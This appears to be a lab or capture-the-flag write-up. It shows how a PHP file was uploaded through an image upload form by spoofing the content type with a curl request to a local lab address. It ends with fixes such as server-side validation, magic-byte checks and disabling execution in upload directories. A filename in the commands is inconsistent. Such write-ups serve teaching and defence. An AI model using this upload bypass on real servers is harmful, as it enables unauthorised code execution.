Context:
Attempt to upload an executable file through an image upload feature.


Method:
Creation of a php file : echo '<?php echo "Hello"; ?>' > /tmp/flag.php
Check if the file exists: ls -l /tmp/bad.php
Look at the file: cat /tmp/flag.php: 
Made the upload look like an image, to see whether the server trusted client headers instead of validating the real file:
curl -X POST \
-F "Upload=Upload" \
-F "uploaded=@/tmp/flag.php;type=image/jpeg" \
"http://192.168.56.101/index.php?page=upload"

After the upload succeeded, I located the uploaded file on the website and checked the server’s response for the flag:
grep 'flag'


Fix:
- Server-side validation only: validate file type on the server.
- Verify signatures (magic bytes) and enforce a list of accepted formats.
- Disable execution in upload directories: configure Apache/Nginx/PHP so uploaded files cannot be executed.
